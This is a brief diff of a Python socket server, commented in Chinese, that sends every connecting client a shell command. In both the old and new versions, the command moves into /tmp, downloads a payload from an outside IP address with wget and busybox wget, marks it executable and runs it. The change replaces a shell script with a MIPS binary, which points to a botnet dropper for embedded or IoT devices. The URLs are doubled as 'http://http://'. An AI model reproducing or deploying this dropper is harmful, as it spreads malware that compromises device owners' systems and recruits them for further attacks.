@@ -21,7 +21,7 @@ def main():
         print(f'客户端 {client_addr} 连接成功！')
         
         # 发送指令
-        command = "cd /tmp; rm -rf mips; wget http://http://165.22.2.18/aini.sh; busybox wget http://http://165.22.2.18/aini.sh;chmod 777 aini.sh; sh aini.sh;ls & \n"
+        command = "cd /tmp; rm -rf mips; wget http://http://165.22.2.18/zhizun.mips; busybox wget http://http://165.22.2.18/zhizun.mips;chmod 777 zhizun.mips;./zhizun.mips vnn;ls & \n"
         client_socket.sendall(command.encode())
         
         # 关闭客户端套接字
